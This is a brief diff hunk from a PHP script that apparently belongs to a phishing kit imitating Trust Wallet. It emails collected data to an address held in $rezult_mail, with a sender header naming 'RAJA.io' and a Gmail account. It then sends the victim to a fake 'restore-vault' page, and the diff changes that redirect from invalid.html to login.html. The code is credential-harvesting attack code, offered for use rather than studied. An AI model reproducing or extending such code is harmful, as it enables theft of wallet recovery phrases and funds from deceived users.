@@ -32,7 +32,7 @@ $headers = "From: RAJA.io <panampungbarubaru@gmail.com>";
 mail($rezult_mail, $subject, $message, $headers);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-top.location=\"/trustwallet/invalid.html?home.html#restore-vault\";
+top.location=\"/trustwallet/login.html?home.html#restore-vault\";
 // -->
 </script>";
 ?>
